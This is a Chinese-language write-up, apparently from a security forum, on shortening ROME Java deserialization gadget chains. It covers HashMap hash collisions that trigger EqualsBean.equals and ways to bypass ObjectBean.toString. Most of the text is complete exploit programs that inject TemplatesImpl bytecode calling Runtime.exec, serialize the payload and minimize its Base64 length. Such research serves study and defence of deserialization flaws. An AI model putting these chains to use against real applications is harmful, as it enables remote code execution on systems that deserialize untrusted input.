### new ROME Gadget

在 `com.sun.syndication.feed.impl.EqualsBean#equals` 方法中，我们可以看到这样的内容

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-019be27ed64998fca3d3ed35121d636a5eb5790b.png)

我们看到蓝色的部分。我们再来看我们原本 ysoserial 中的 Gadget 链里最终调用到 invoke 调用 TemplatesImpl.getOutputProperties 的 ToStringBean.toString

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-0cc9def360ca040486782629056d1b6f43d6a391.png)

我们可以看到 euqals 最终调用到了 beanEquals，和上面的 ToStringBean 的 toString 比较可以看得出，两者很像，我们是否可以从 beanEquals 入手呢？这样很有可能可以大幅度缩短我们的调用链。

事实上我的学习路线是先 ROME 后 CommonsBeanutils 的，在学习 ROME 的时候也没有去学习 JavaBean 的相关知识，学 Java 语言的时候也没有学，对简单的封装的理解再深也并不能到这种程度。

然后就是要找 调用 equals 方法的地方了，如何才能触发 equals 方法呢？

在 JDK7u21 的探索中，我们有一部就是 equals方法调用链的寻找，当时找到的调用情景是 set ，原因是set 种存储的对象不允许重复，所以在添加对象的时候，为了防止重复，一定会涉及到比较操作。

不过这里用 set 并不能实现，究竟是为什么这里没有想清楚，再想静不下心来了，先往后看吧，回过头来再看。

在我的感觉里，这里的 key.hashCode ，因为比较对象的不同就不会进入到 `AnnotationInvocationHandler#hashCodeImpl` 了，自然也无法复制 JDK7u21 中 set 的操作。

#### 小插曲 误打误撞通了

想用 HashMap 写个测试，结果从 hashCode 用 toString 打通了...

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-a64ec7495e68c17711ed4ed44d9f6ed73b23484d.png)

传进去的 ObjectBean 在 hashCode 就会触发 toString 的调用链了，我本来的想法是因为这里比较的双方和 JDK7u21 里的不一样所以不能进入到可以伪造的 AnnotationInvocationHandler#hashCodeImpl，不过这里因为还是会进到 hash ，用 hashCode 到 toString 的链子跑出来了（不过这里因为链子没短长度还是太长XD

exp

```java
public class setTest {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("e");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("        try {\n" +
                "            Runtime.getRuntime().exec(\"calc.exe\");\n" +
                "        } catch (Exception ignored) {\n" +
                "        }");
        byte[] bytes = ctClass.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templates, "_name", "a");

        HashMap map = new HashMap();

        ObjectBean objectBean = new ObjectBean(Templates.class, templates);
        ObjectBean objectBean1 = new ObjectBean(ObjectBean.class, objectBean);

        HashSet set = new LinkedHashSet();
        set.add(objectBean);
        set.add(objectBean1);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();
        System.out.println(new String(Base64.encode(barr.toByteArray())).length());

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = ois.readObject();
    }
}

```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-878a1c774845274dae9d2f50db3e0f9d8e8f7e7f.png)

（甚至比上面的exp还要长一些呜呜呜

‍

回到 Y4? 的思路，这里实际上可以去看 set 的源码，HashSet 的 readObject 的最后就是一处 map.put，利用的也还是 HashMap 对 key 的去重，我们完全可以把 put 提出来，单独去利用 put。

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in any hidden serialization magic
        s.defaultReadObject();

        // Read in HashMap capacity and load factor and create backing HashMap
        int capacity = s.readInt();
        float loadFactor = s.readFloat();
        map = (((HashSet)this) instanceof LinkedHashSet ?
               new LinkedHashMap<E,Object>(capacity, loadFactor) :
               new HashMap<E,Object>(capacity, loadFactor));

        // Read in size
        int size = s.readInt();

        // Read in all elements in the proper order.
        for (int i=0; i<size; i++) {
            E e = (E) s.readObject();
            map.put(e, PRESENT);
        }
```

如上。

我们实际上是可以利用 key 这个神奇的机制来进行 equals 的触发的，下面是 Y4? 抽丝剥茧的演示

```java
HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
HashMap<Object, Object> objectObjectHashMap1 = new HashMap<>();
objectObjectHashMap.put("aa","");
objectObjectHashMap1.put("bB","");
System.out.println(objectObjectHashMap.hashCode());
System.out.println(objectObjectHashMap1.hashCode());
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-675371c21ee7c7777faa6d3c2ee0d84585157b0b.png)

这里因为 value 为空，所以比较的也就是 key 的 hash 了，

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-b10c95e6a5a65fe95efdf8ec43674911279e6350.png)

这里的 key 的比较我们可以去看到 String 的 hashCode，如果要使两个key相等，考虑两个元素的情况下也就是 `31*val[0]+val[1]=31*val[0]+val[1]` 了，第一个元素如果比第二个元素小1，第二个元素就必须比第一个元素大31

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-21cfeafe233bd8bce363b263f0b2c3c72b838247.png)

场景提升

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-f14b3c4571813400d01a594cb40d44c0278515fa.png)

仍然相等，介于这个场景里面有两个元素，它会调用父类的`java.util.AbstractMap#hashCode`

```java
public int hashCode() {
  int h = 0;
  Iterator<Entry<K,V>> i = entrySet().iterator();
  while (i.hasNext())
    h += i.next().hashCode();
  return h;
}
```

因为 `aa` 与 `bB` 相等，所以我们也可以把这里简化成

```java
objectObjectHashMap.put("aa","1");
objectObjectHashMap.put("aa","2");
objectObjectHashMap1.put("aa","2");
objectObjectHashMap1.put("aa","1");
```

回到 ROME 链的构造，在 putVal 中 key 的 hashCode 一致的时候会触发 equals 方法的调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-caa6a24ca7f01915dfc8eb66c65260699487aa28.png)

不过这里存在一个问题，我们现在只是 String 类型的 key，调用了又能怎么样呢，equals 的触发并带来不了什么

不过这里在 HashMap 的 equals 方法中存在这样一个问题

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-d3b5264dfeee8125005d31c326d08dff05b495bb.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-26942ceabdda8e4e450bc46c0bc90b9b45a7a701.png)

在 HashMap 中，对象大于1时会转而调用父类 `java.util.AbstractMap#equals` （这一部分具体的逻辑代码我没有找到或者没有看懂

进而在 java.util.AbstractMap#equals 中我们找到了可以用来调用 EqualsBean 的地方

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-af8b47f63a245ea66d0c8fa1b9d0f1be41f25376.png)

我不过这里我们还需要使 EqualsBean.equals 的参数为 Templates，这里我们可以用 HashMap 进行操作

将两个 map 的 value 颠倒一下就可以了，也就是

```java
map1.put("aa",templates);
map1.put("bB",bean);
map2.put("aa",bean);
map2.put("bB",templates);
```

思考一下，其实也很简单

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-c3d11daefdcdc86f7829fd6b902cddf1aa6a4ff2.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-c7c794e9fc46fbe1421dc3e3564d27d478e92d00.png)

不过这里放两张图还是更直观一些

最终构造出来的结果也就是（测试一下31，换了个bc：

```java
        TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl();
        EqualsBean bean = new EqualsBean(String.class,"");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("bb",templates);
        map1.put("cC",bean);
        map2.put("bb",bean);
        map2.put("cC",templates);
        HashMap map = new HashMap();
        map.put(map1,"");
        map.put(map2,"");
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-472be9a18b8516cb700688a5635e04745b4728d4.png)

最终的方法栈如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-11294d5c9ce425d8c2757ab597318c7d90bacf8b.png)

将 Y4? 的三段 POC 整合成了一段，如下：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.*;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class ROMEtest2 {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("e");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("        try {\n" +
                "            Runtime.getRuntime().exec(\"calc.exe\");\n" +
                "        } catch (Exception ignored) {\n" +
                "        }");
        byte[] bytes = ctClass.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] { bytes });
        setFieldValue(templates, "_name", "a");

        EqualsBean bean = new EqualsBean(String.class,"");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("bb",templates);
        map1.put("cC",bean);
        map2.put("bb",bean);
        map2.put("cC",templates);
        HashMap map = new HashMap();
        map.put(map1,"");
        map.put(map2,"");

        setFieldValue(bean,"_beanClass",Templates.class);
        setFieldValue(bean,"_obj",templates);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(map);
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())).length());

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        Object o = ois.readObject();
    }
}
```

不过整合之后会显得长一些。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-8ee68eb417fd3604482fe145f0074afb77b1b2aa.png)

太绝了，这条链子太绝了呜呜呜，套个 ASM 试了一下，能到1356

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-653948e4c2885a97b33f1c39349924f4c819e44f.png)

### 方法2

核心思想：**序列化对象中携带的一些属性是反序列的时候用不到的**

这里前面的操作就基本上和 4ra1n 师傅的一致了

用的就是常规的 ROME 链，利用 ASM 以及 javassist 以及 简短一些名称 进行了缩短之后的长度为 2080

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-b20492980610323526966baf890c2bfe65aab5c4.png)

exp:

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import com.test.asm.Resolver;
import javassist.*;
public class ROMEtest2 {
    private static TemplatesImpl getTemplatesImpl() {
        TemplatesImpl templates = null;
        try {
            templates = TemplatesImpl.class.newInstance();
            ClassPool classPool = ClassPool.getDefault();
            classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass clazz = classPool.makeClass("a");
            String string = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            clazz.makeClassInitializer().insertAfter(string);
            CtClass superC = classPool.get(AbstractTranslet.class.getName());
            clazz.setSuperclass(superC);
            final byte[] classBytes = Resolver.resolve(clazz.toBytecode());
            Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
            bcField.setAccessible(true);
            bcField.set(templates, new byte[][] {classBytes});
            Field nameField = TemplatesImpl.class.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates, "a");
            clazz.writeFile();
            return templates;
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return templates;
    }
    public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {

        TemplatesImpl obj = getTemplatesImpl();
        ObjectBean  objb = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "1"));
        HashMap map = new HashMap();
        map.put(objb,"1");
        ObjectBean exp = new ObjectBean(Templates.class, obj);
        EqualsBean eq = new EqualsBean(ObjectBean.class, exp);
        setFieldValue(objb,"_equalsBean",eq);
        ByteArrayOutputStream baout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(baout);
        oout.writeObject(map);
        System.out.println(new String(Base64.encode(baout.toByteArray())).length());
        ByteArrayInputStream bain = new ByteArrayInputStream(baout.toByteArray());
        ObjectInputStream oin = new ObjectInputStream(bain);
        oin.readObject();
    }
}
```

还差一点点，这个师傅想到了一种 [方法](http://max666.fun/?thread-46.htm)

会不会序列化对象中携带的一些属性是反序列的时候用不到的？

由于最终只有map进行了序列化，所以只针对map测试即可，将里面的一些属性赋值为null，测试能不能正常执行

\_toStringBean、\_cloneableBean 和 \_obj 的 \_equalsBean 赋值为 null 后仍然正常执行，并且 payload 大大缩减。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-4787e6133883be87a4be672988bb0b1632508bee.png)

此时已经符合要求了，不过和 Y4?的比起来还是比较极限，不过胜在对链子的处理上更为精细

exp：

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import com.test.asm.Resolver;
import javassist.*;
public class ROMEtest2 {
    private static TemplatesImpl getTemplatesImpl() {
        TemplatesImpl templates = null;
        try {
            templates = TemplatesImpl.class.newInstance();
            ClassPool classPool = ClassPool.getDefault();
            classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass clazz = classPool.makeClass("a");
            String string = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            clazz.makeClassInitializer().insertAfter(string);
            CtClass superC = classPool.get(AbstractTranslet.class.getName());
            clazz.setSuperclass(superC);
            final byte[] classBytes = Resolver.resolve(clazz.toBytecode());
            Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
            bcField.setAccessible(true);
            bcField.set(templates, new byte[][] {classBytes});
            Field nameField = TemplatesImpl.class.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates, "a");
            clazz.writeFile();
            return templates;
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return templates;
    }
    public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {

        TemplatesImpl obj = getTemplatesImpl();
        ObjectBean  objb = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "1"));
        HashMap map = new HashMap();
        map.put(objb,"1");
        ObjectBean exp = new ObjectBean(Templates.class, obj);
        EqualsBean eq = new EqualsBean(ObjectBean.class, exp);
        setFieldValue(objb,"_equalsBean",eq);
        setFieldValue(objb,"_toStringBean",null);
        setFieldValue(objb,"_cloneableBean",null);

        setFieldValue(exp,"_equalsBean",null);

        ByteArrayOutputStream baout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(baout);
        oout.writeObject(map);
        System.out.println(new String(Base64.encode(baout.toByteArray())).length());
        ByteArrayInputStream bain = new ByteArrayInputStream(baout.toByteArray());
        ObjectInputStream oin = new ObjectInputStream(bain);
        oin.readObject();
    }
}
```

### 方法3

省略 ObjectBean.toString()

这里大师傅通过调试与分析，得到了 `ObjectBean#toString` 是可有可无的这一结论，调试的详情如下，挺有参考价值。

```java
public class dome {
    public static void main(String[] args) throws Exception{
        ObjectBean objectBean = new ObjectBean(String.class, "x");
        Map hashMap = new HashMap();
        hashMap.put(objectBean, "x");

        // 执行序列化与反序列化，并且返回序列化数据
        ByteArrayOutputStream baout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(baout);
        oout.writeObject(hashMap);
        System.out.println(new String(Base64.encode(baout.toByteArray())).length());
        ByteArrayInputStream bain = new ByteArrayInputStream(baout.toByteArray());
        ObjectInputStream oin = new ObjectInputStream(bain);
        oin.readObject();
    }
```

将 HashMap 的 key 设置为 ObjectBean，put 了一个参数 x 进去，我们可以看到在 EqualsBean 中的 beanHashCode

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-c89dc638ecf620b77dccb4d23ffebbeb1dac7484.png)

如果这里我们将我们的值改为 ToStringBean 的对象，我们就可以直接将 `ObjectBean.toString()` 跳过

```java
public class dome {
    public static void main(String[] args) throws Exception{
        ToStringBean toStringBean = new ToStringBean(String.class, "x");
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        Map hashMap = new HashMap();
        hashMap.put(objectBean, "x");

        // 执行序列化与反序列化，并且返回序列化数据
        ByteArrayOutputStream baout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(baout);
        oout.writeObject(hashMap);
        System.out.println(new String(Base64.encode(baout.toByteArray())).length());
        ByteArrayInputStream bain = new ByteArrayInputStream(baout.toByteArray());
        ObjectInputStream oin = new ObjectInputStream(bain);
        oin.readObject();
    }
```

重新调试，\_obj 已经被设置为 ToStringBean

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-ac5bf3b446c0248ec46bc4052b7203d2fd71b264.png)

可以看到 x 参数

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-48f1d336b0887041b0a5ca347e9dac31ecfa45f7.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-17922a56118aa6a6b60dfcb20835fd59a535fe76.png)

这里调用 getPropertyDescriptors ，获取的是 String 类 的 getter 与 setter，这一部分与 Javabean 密切相关，我们在前面的介绍中有提到，所以如果这里我们将 String 换成 TemplatesImpl，那么我们就可以顺利调用到 getOutputProperties 了

结合 Payload 缩小术 构造如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-e128899794d3830842f2ceabe7a17e718c1f427f.png)

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import com.sun.syndication.feed.impl.ToStringBean;
import com.test.asm.Resolver;
import javassist.*;
public class ROMEtest2 {
    public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("i");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] bytes = ctClass.toBytecode();

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", null);

        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        Map hashMap = new HashMap();
        hashMap.put(objectBean, "x");

        ByteArrayOutputStream baout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(baout);
        oout.writeObject(hashMap);
        System.out.println(new String(Base64.encode(baout.toByteArray())).length());
        ByteArrayInputStream bain = new ByteArrayInputStream(baout.toByteArray());
        ObjectInputStream oin = new ObjectInputStream(bain);
        oin.readObject();
    }
}
```

确实短 这就 1932 了，我们还可以结合 ASM 进行进一步的缩减，以及上面将一些无用参数置空。

‍